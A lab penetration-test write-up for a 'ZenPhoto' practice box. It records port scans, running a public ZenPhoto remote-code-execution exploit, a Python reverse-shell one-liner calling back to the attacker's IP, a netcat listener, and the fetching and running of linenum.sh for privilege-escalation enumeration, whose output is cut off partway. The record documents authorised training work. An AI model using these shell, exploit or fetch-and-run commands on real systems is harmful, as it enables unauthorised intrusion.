# ZenPhoto

# Enumeration

## nmap

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 192.168.162.41                                                                                                                                 62 ⨯ 1 ⚙
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.162.41:22
Open 192.168.162.41:23
Open 192.168.162.41:80
Open 192.168.162.41:3306
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-29 04:06 EST
Initiating Ping Scan at 04:06
Scanning 192.168.162.41 [2 ports]
Completed Ping Scan at 04:06, 0.17s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:06
Completed Parallel DNS resolution of 1 host. at 04:06, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:06
Scanning 192.168.162.41 [4 ports]
Discovered open port 3306/tcp on 192.168.162.41
Discovered open port 80/tcp on 192.168.162.41
Discovered open port 23/tcp on 192.168.162.41
Discovered open port 22/tcp on 192.168.162.41
Completed Connect Scan at 04:06, 0.17s elapsed (4 total ports)
Nmap scan report for 192.168.162.41
Host is up, received syn-ack (0.17s latency).
Scanned at 2022-01-29 04:06:30 EST for 1s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
23/tcp   open  telnet  syn-ack
80/tcp   open  http    syn-ack
3306/tcp open  mysql   syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds

                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

## 22 - SSH


## 23 - CUPS

```
┌──(kali㉿kali)-[~]
└─$ telnet 192.168.162.41 23                                                                                                                                      130 ⨯
Trying 192.168.162.41...
Connected to 192.168.162.41.
Escape character is '^]'.
help
Connection closed by foreign host.
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$           
```


```
┌──(kali㉿kali)-[/tmp]
└─$ curl http://192.168.162.41:23/                                        
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<HEAD>
        <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
        <TITLE>403 Forbidden</TITLE>
        <LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
</HEAD>
<BODY>
<H1>403 Forbidden</H1>
<P></P>
</BODY>
</HTML>
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ ssh kali@localhost -L 8888:192.168.162.41:23                                
ssh: connect to host localhost port 22: Connection refused
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo systemctl restart ssh                                                                                                                                    255 ⨯
[sudo] password for kali: 
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ ssh kali@localhost -L 8888:192.168.162.41:23
kali@localhost's password: 
Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jan 23 02:34:46 2022
┏━(Message from Kali developers)
┃
┃ This is a minimal installation of Kali Linux, you likely
┃ want to install supplementary tools. Learn how:
┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
┃
┃ We have kept /usr/bin/python pointing to Python 2 for backwards
┃ compatibility. Learn how to change this and avoid this message:
┃ ⇒ https://www.kali.org/docs/general-use/python3-transition/
┃
┗━(Run “touch ~/.hushlogin” to hide this message)
┌──(kali㉿kali)-[~]
└─$ 

```

![](Pasted%20image%2020220129193603.png)

## 80 - Web

### Dir Brute Forcing
```
200        4l        5w       75c http://192.168.162.41/index
200        4l        5w       75c http://192.168.162.41/index.html
301        9l       28w      315c http://192.168.162.41/test
```

![](Pasted%20image%2020220129172529.png)

Googling for admin page

https://www.google.com/search?q=zenphoto+default+credentials&oq=zenphoto+default+credentials&aqs=chrome.0.69i59.4384j0j7&sourceid=chrome&ie=UTF-8
* https://www.inmotionhosting.com/support/website/login-zenphoto/#:~:text=To%20log%20into%20Zenphoto%2C%20add,%2Fzp%2Dcore%2Fadmin.

![](Pasted%20image%2020220129173105.png)

## 3306 - MySQL

# Exploitation
https://www.exploit-db.com/exploits/18083
Checking if the path in the exploit exists `{$path}zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php`

![](Pasted%20image%2020220129173441.png)


```
┌──(kali㉿kali)-[~/Documents]
└─$ searchsploit zenphoto 
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ZenPhoto - 'admin-news-articles.php' Cross-Site Scripting                                                                             | php/webapps/37903.txt
ZenPhoto - 'index.php' SQL Injection                                                                                                  | php/webapps/38326.txt
ZenPhoto - Config Update / Command Execution                                                                                          | php/webapps/15114.php
ZenPhoto - SQL Injection                                                                                                              | php/webapps/39062.txt
ZenPhoto 0.9/1.0 - 'i.php?a' Cross-Site Scripting                                                                                     | php/webapps/27795.txt
ZenPhoto 0.9/1.0 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                                                          | php/webapps/27796.txt
ZenPhoto 1.1.3 - 'rss.php?albumnr' SQL Injection                                                                                      | php/webapps/4823.pl
ZenPhoto 1.2.5 - Completely Blind SQL Injection                                                                                       | php/webapps/9154.js
ZenPhoto 1.3 - '/zp-core/admin.php' Multiple Cross-Site Scripting Vulnerabilities                                                     | php/webapps/34611.txt
ZenPhoto 1.3 - '/zp-core/full-image.php?a' SQL Injection                                                                              | php/webapps/34610.txt
ZenPhoto 1.4.0.3 - '_zp_themeroot' Multiple Cross-Site Scripting Vulnerabilities                                                      | php/webapps/35648.txt
ZenPhoto 1.4.0.3 - x-forwarded-for HTTP Header Persistent Cross-Site Scripting                                                        | php/webapps/17200.txt
ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution                                                                     | php/webapps/18083.php
ZenPhoto 1.4.10 - Local File Inclusion                                                                                                | php/webapps/38841.txt
ZenPhoto 1.4.11 - Remote File Inclusion                                                                                               | php/webapps/39571.txt
ZenPhoto 1.4.3.3 - Multiple Vulnerabilities                                                                                           | php/webapps/22524.txt
ZenPhoto 1.4.8 - Multiple Vulnerabilities                                                                                             | php/webapps/37602.txt
ZenPhoto CMS 1.3 - Multiple Cross-Site Request Forgery Vulnerabilities                                                                | php/webapps/14359.html
ZenPhoto Gallery 1.2.5 - Admin Password Reset (Cross-Site Request Forgery)                                                            | php/webapps/9166.txt
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Paper Title                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
MOAUB #26 - Zenphoto - Config Update / Command Execution                                                                              | docs/english/15115-moaub-26---ze
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Documents]
└─$ cd /tmp                                                                                                                            
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit -m 18083
  Exploit: ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/18083
     Path: /usr/share/exploitdb/exploits/php/webapps/18083.php
File Type: PHP script, ASCII text

Copied to: /tmp/18083.php


                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ php 18083.php                                                                                

+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

Usage......: php 18083.php <host> <path>

Example....: php 18083.php localhost /
Example....: php 18083.php localhost /zenphoto/
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ php 18083.php 192.168.162.41 /test/

+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

zenphoto-shell# whoami
www-data

zenphoto-shell# ls /usr/bin | grep python
python
python2
python2.6

zenphoto-shell# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.162",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

[-] Exploit failed!
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443 
[sudo] password for kali: 
listening on [any] 443 ...
connect to [192.168.49.162] from (UNKNOWN) [192.168.162.41] 50048
<p-extensions/tiny_mce/plugins/ajaxfilemanager/inc$ cd /home
cd /home
www-data@offsecsrv:/home$ ls
ls
local.txt
www-data@offsecsrv:/home$ cat local.txt
cat local.txt
5651465f2edc144d81fec47102245f71
www-data@offsecsrv:/home$ ifconfig
ifconfig
Command 'ifconfig' is available in '/sbin/ifconfig'
The command could not be located because '/sbin' is not included in the PATH environment variable.
This is most likely caused by the lack of administrative priviledges associated with your user account.
ifconfig: command not found
www-data@offsecsrv:/home$ cat local.txt
cat local.txt
5651465f2edc144d81fec47102245f71
www-data@offsecsrv:/home$ /sbin/ifconfig
/sbin/ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:ba:71:03  
          inet addr:192.168.162.41  Bcast:192.168.162.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feba:7103/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:216081 errors:2 dropped:4 overruns:0 frame:0
          TX packets:214640 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:21388806 (21.3 MB)  TX bytes:45792862 (45.7 MB)
          Interrupt:18 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:792 errors:0 dropped:0 overruns:0 frame:0
          TX packets:792 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:80982 (80.9 KB)  TX bytes:80982 (80.9 KB)

www-data@offsecsrv:/home$ 
```

![](Pasted%20image%2020220129173716.png)

# Privesc
## Enum

```
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80                                                                                       
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.162.41 - - [29/Jan/2022 04:38:28] "GET /lse.sh HTTP/1.0" 200 -
```

### linenum

```
www-data@offsecsrv:/tmp$ wget 192.168.49.51:8000/linenum.sh
wget 192.168.49.51:8000/linenum.sh
--2022-02-06 02:58:16--  http://192.168.49.51:8000/linenum.sh
Connecting to 192.168.49.51:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: `linenum.sh'

100%[======================================>] 46,631      89.3K/s   in 0.5s    

2022-02-06 02:58:17 (89.3 KB/s) - `linenum.sh' saved [46631/46631]

www-data@offsecsrv:/tmp$ chmod +x linenum.sh
chmod +x linenum.sh
www-data@offsecsrv:/tmp$ ./linenum.sh
./linenum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Sun Feb  6 02:58:28 EST 2022                                                                                                                                            
                                                                                                                                                                        

### SYSTEM ##############################################
[-] Kernel information:
Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux


[-] Kernel information (continued):
Linux version 2.6.32-21-generic (buildd@rothera) (gcc version 4.4.3 (Ubuntu 4.4.3-4ubuntu5) ) #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=10.04
DISTRIB_CODENAME=lucid
DISTRIB_DESCRIPTION="Ubuntu 10.04.3 LTS"


[-] Hostname:
offsecsrv


### USER/GROUP ##########################################
[-] Current user/group info:
uid=33(www-data) gid=33(www-data) groups=33(www-data)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest


[-] Who else is logged on:
 02:58:28 up 14 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)
uid=101(syslog) gid=103(syslog) groups=103(syslog)
uid=102(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=103(avahi-autoipd) gid=110(avahi-autoipd) groups=110(avahi-autoipd)
uid=104(avahi) gid=111(avahi) groups=111(avahi)
uid=105(couchdb) gid=113(couchdb) groups=113(couchdb)
uid=106(speech-dispatcher) gid=29(audio) groups=29(audio)
uid=107(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=108(haldaemon) gid=114(haldaemon) groups=114(haldaemon)
uid=109(kernoops) gid=65534(nogroup) groups=65534(nogroup)
uid=110(pulse) gid=115(pulse) groups=115(pulse),29(audio)
uid=111(rtkit) gid=117(rtkit) groups=117(rtkit)
uid=112(saned) gid=118(saned) groups=118(saned)
uid=113(hplip) gid=7(lp) groups=7(lp)
uid=115(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=116(mysql) gid=123(mysql) groups=123(mysql)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:107::/var/run/dbus:/bin/false
avahi-autoipd:x:103:110:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:104:111:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
couchdb:x:105:113:CouchDB Administrator,,,:/var/lib/couchdb:/bin/bash
speech-dispatcher:x:106:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
usbmux:x:107:46:usbmux daemon,,,:/home/usbmux:/bin/false
haldaemon:x:108:114:Hardware abstraction layer,,,:/var/run/hald:/bin/false
kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:110:115:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:111:117:RealtimeKit,,,:/proc:/bin/false
saned:x:112:118::/home/saned:/bin/false
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
sshd:x:115:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:116:123:MySQL Server,,,:/var/lib/mysql:/bin/false


[-] Super user account(s):
root


[-] Are permissions on /home directories lax:
total 12K
drwxr-xr-x  2 root     root     4.0K Jul  9  2020 .
drwxr-xr-x 22 root     root     4.0K Mar 30  2021 ..
-rw-r--r--  1 www-data www-data   33 Feb  6 02:46 local.txt


[-] Root is allowed to login via SSH:
PermitRootLogin yes


### ENVIRONMENTAL #######################################
[-] Environment information:
APACHE_PID_FILE=/var/run/apache2.pid
APACHE_RUN_USER=www-data
PATH=/usr/local/bin:/usr/bin:/bin
PWD=/tmp
LANG=C
APACHE_RUN_GROUP=www-data
SHLVL=2
_=/usr/bin/env


[-] Path information:
/usr/local/bin:/usr/bin:/bin
drwxr-xr-x 2 root root  4096 Nov  8  2011 /bin
drwxr-xr-x 2 root root 36864 Feb 27  2015 /usr/bin
drwxr-xr-x 2 root root  4096 Jul 19  2011 /usr/local/bin


[-] Available shells:
# /etc/shells: valid login shells
/bin/csh
/bin/sh
/usr/bin/es
/usr/bin/ksh
/bin/ksh
/usr/bin/rc
/usr/bin/tcsh
/bin/tcsh
/usr/bin/esh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/screen


[-] Current umask value:
0022
u=rwx,g=rx,o=rx


[-] Password and storage information:
PASS_MAX_DAYS   99999
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  724 Apr 14  2010 /etc/crontab

/etc/cron.d:
total 28
drwxr-xr-x   2 root root  4096 Nov  9  2011 .
drwxr-xr-x 131 root root 12288 Mar 30  2021 ..
-rw-r--r--   1 root root   102 Apr 14  2010 .placeholder
-rw-r--r--   1 root root   288 Mar  4  2010 anacron
-rw-r--r--   1 root root   499 Oct 14  2011 php5

/etc/cron.daily:
total 80
drwxr-xr-x   2 root root  4096 Nov  9  2011 .
drwxr-xr-x 131 root root 12288 Mar 30  2021 ..
-rw-r--r--   1 root root   102 Apr 14  2010 .placeholder
-rwxr-xr-x   1 root root   311 Mar  4  2010 0anacron
-rwxr-xr-x   1 root root   633 Sep  1  2011 apache2
-rwxr-xr-x   1 root root   189 Apr 19  2010 apport
-rwxr-xr-x   1 root root 15914 May 30  2011 apt
-rwxr-xr-x   1 root root   314 Apr  9  2010 aptitude
-rwxr-xr-x   1 root root   502 Nov 10  2009 bsdmainutils
-rwxr-xr-x   1 root root   256 Apr 15  2010 dpkg
-rwxr-xr-x   1 root root    89 Mar  6  2010 logrotate
-rwxr-xr-x   1 root root  1327 Oct  5  2010 man-db
-rwxr-xr-x   1 root root   606 Mar 24  2010 mlocate
-rwxr-xr-x   1 root root  2149 Jun 16  2009 popularity-contest
-rwxr-xr-x   1 root root  3349 Apr 14  2010 standard

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Jul 19  2011 .
drwxr-xr-x 131 root root 12288 Mar 30  2021 ..
-rw-r--r--   1 root root   102 Apr 14  2010 .placeholder

/etc/cron.monthly:
total 28
drwxr-xr-x   2 root root  4096 Jul 19  2011 .
drwxr-xr-x 131 root root 12288 Mar 30  2021 ..
-rw-r--r--   1 root root   102 Apr 14  2010 .placeholder
-rwxr-xr-x   1 root root   313 Mar  4  2010 0anacron
-rwxr-xr-x   1 root root   129 Apr 14  2010 standard

/etc/cron.weekly:
total 32
drwxr-xr-x   2 root root  4096 Jul 19  2011 .
drwxr-xr-x 131 root root 12288 Mar 30  2021 ..
-rw-r--r--   1 root root   102 Apr 14  2010 .placeholder
-rwxr-xr-x   1 root root   312 Mar  4  2010 0anacron
-rwxr-xr-x   1 root root   203 Mar 30  2010 apt-xapian-index
-rwxr-xr-x   1 root root   887 Oct  5  2010 man-db


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


[-] Anacron jobs and associated file permissions:
-rw-r--r-- 1 root root 395 Mar  4  2010 /etc/anacrontab
# /etc/anacrontab: configuration file for anacron

# See anacron(8) and anacrontab(5) for details.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# These replace cron's entries
1       5       cron.daily       nice run-parts --report /etc/cron.daily
7       10      cron.weekly      nice run-parts --report /etc/cron.weekly
@monthly        15      cron.monthly nice run-parts --report /etc/cron.monthly


[-] When were jobs last executed (/var/spool/anacron contents):
total 20
drwxr-xr-x 2 root root 4096 Nov  8  2011 .
drwxr-xr-x 7 root root 4096 Jul 19  2011 ..
-rw------- 1 root root    9 Feb  6 02:48 cron.daily
-rw------- 1 root root    9 Mar 20  2020 cron.monthly
-rw------- 1 root root    9 Mar 20  2020 cron.weekly


### NETWORKING  ##########################################
[-] Network and IP info:
eth0      Link encap:Ethernet  HWaddr 00:50:56:bf:aa:71  
          inet addr:192.168.51.41  Bcast:192.168.51.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:febf:aa71/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:154 errors:0 dropped:0 overruns:0 frame:0
          TX packets:177 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:60848 (60.8 KB)  TX bytes:44754 (44.7 KB)
          Interrupt:18 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)


[-] ARP history:
192.168.51.254 dev eth0 lladdr 00:50:56:9f:d0:96 REACHABLE


[-] Nameserver(s):
nameserver 192.168.51.254


[-] Default route:
default via 192.168.51.254 dev eth0  metric 100 


[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               


[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 0.0.0.0:58566           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -               


### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1   2808  1672 ?        Ss   02:43   0:00 /sbin/init
root         2  0.0  0.0      0     0 ?        S    02:43   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    02:43   0:00 [migration/0]
root         4  0.0  0.0      0     0 ?        S    02:43   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S    02:43   0:00 [watchdog/0]
root         6  0.0  0.0      0     0 ?        S    02:43   0:00 [events/0]
root         7  0.0  0.0      0     0 ?        S    02:43   0:00 [cpuset]
root         8  0.0  0.0      0     0 ?        S    02:43   0:00 [khelper]
root         9  0.0  0.0      0     0 ?        S    02:43   0:00 [netns]
root        10  0.0  0.0      0     0 ?        S    02:43   0:00 [async/mgr]
root        11  0.0  0.0      0     0 ?        S    02:43   0:00 [pm]
root        12  0.0  0.0      0     0 ?        S    02:43   0:00 [sync_supers]
root        13  0.0  0.0      0     0 ?        S    02:43   0:00 [bdi-default]
root        14  0.0  0.0      0     0 ?        S    02:43   0:00 [kintegrityd/0]
root        15  0.0  0.0      0     0 ?        S    02:43   0:00 [kblockd/0]
root        16  0.0  0.0      0     0 ?        S    02:43   0:00 [kacpid]
root        17  0.0  0.0      0     0 ?        S    02:43   0:00 [kacpi_notify]
root        18  0.0  0.0      0     0 ?        S    02:43   0:00 [kacpi_hotplug]
root        19  0.0  0.0      0     0 ?        S    02:43   0:00 [ata/0]
root        20  0.0  0.0      0     0 ?        S    02:43   0:00 [ata_aux]
root        21  0.0  0.0      0     0 ?        S    02:43   0:00 [ksuspend_usbd]
root        22  0.0  0.0      0     0 ?        S    02:43   0:00 [khubd]
root        23  0.0  0.0      0     0 ?        S    02:43   0:00 [kseriod]
root        24  0.0  0.0      0     0 ?        S    02:43   0:00 [kmmcd]
root        27  0.0  0.0      0     0 ?        S    02:43   0:00 [khungtaskd]
root        28  0.0  0.0      0     0 ?        S    02:43   0:00 [kswapd0]
root        29  0.0  0.0      0     0 ?        SN   02:43   0:00 [ksmd]
root        30  0.0  0.0      0     0 ?        S    02:43   0:00 [aio/0]
root        31  0.0  0.0      0     0 ?        S    02:43   0:00 [ecryptfs-kthrea]
root        32  0.0  0.0      0     0 ?        S    02:43   0:00 [crypto/0]
root        35  0.0  0.0      0     0 ?        S    02:43   0:00 [pciehpd]
root        37  0.0  0.0      0     0 ?        S    02:43   0:00 [scsi_eh_0]
root        38  0.0  0.0      0     0 ?        S    02:43   0:00 [scsi_eh_1]
root        40  0.0  0.0      0     0 ?        S    02:43   0:00 [kstriped]
root        42  0.0  0.0      0     0 ?        S    02:43   0:00 [kmpathd/0]
root        43  0.0  0.0      0     0 ?        S    02:43   0:00 [kmpath_handlerd]
root        44  0.0  0.0      0     0 ?        S    02:43   0:00 [ksnapd]
root        45  0.0  0.0      0     0 ?        S    02:43   0:00 [kondemand/0]
root        46  0.0  0.0      0     0 ?        S    02:43   0:00 [kconservative/0]
root       233  0.0  0.0      0     0 ?        S    02:43   0:00 [mpt_poll_0]
root       281  0.0  0.0      0     0 ?        S    02:43   0:00 [mpt/0]
root       298  0.0  0.0      0     0 ?        S    02:43   0:00 [scsi_eh_2]
root       315  0.0  0.0      0     0 ?        S    02:43   0:00 [jbd2/sda1-8]
root       316  0.0  0.0      0     0 ?        S    02:43   0:00 [ext4-dio-unwrit]
root       360  0.0  0.0   2312  1020 ?        S    02:43   0:00 upstart-udev-bridge --daemon
root       362  0.0  0.1   2712  1208 ?        S<s  02:43   0:00 udevd --daemon
root       594  0.0  0.0      0     0 ?        S    02:43   0:00 [kpsmoused]
root       629  0.0  0.1   2708  1156 ?        S<   02:43   0:00 udevd --daemon
root       684  0.0  0.1   2708  1156 ?        S<   02:43   0:00 udevd --daemon
syslog     723  0.0  0.1  33548  1524 ?        Sl   02:43   0:00 rsyslogd -c4
102        753  0.0  0.0   2776   980 ?        Ss   02:43   0:00 dbus-daemon --system --fork
root       760  0.0  0.4   9504  4456 ?        Ss   02:43   0:00 NetworkManager
root       764  0.0  0.2   4168  2300 ?        S    02:43   0:00 /usr/sbin/modem-manager
avahi      767  0.0  0.1   2924  1528 ?        S    02:43   0:00 avahi-daemon: registering [offsecsrv.local]
avahi      769  0.0  0.0   2924   548 ?        Ss   02:43   0:00 avahi-daemon: chroot helper
root       778  0.0  0.1   4832  1724 ?        S    02:43   0:00 /sbin/wpa_supplicant -u -s
root       815  0.0  0.0   1788   552 tty4     Ss+  02:43   0:00 /sbin/getty -8 38400 tty4
root       825  0.0  0.0   1788   564 tty5     Ss+  02:43   0:00 /sbin/getty -8 38400 tty5
root       830  0.0  0.0   1788   564 tty2     Ss+  02:43   0:00 /sbin/getty -8 38400 tty2
root       831  0.0  0.0   1788   556 tty3     Ss+  02:43   0:00 /sbin/getty -8 38400 tty3
root       834  0.0  0.0   1788   560 tty6     Ss+  02:43   0:00 /sbin/getty -8 38400 tty6
root       835  0.0  0.0   2044   856 ?        Ss   02:43   0:00 acpid -c /etc/acpi/events -s /var/run/acpid.socket
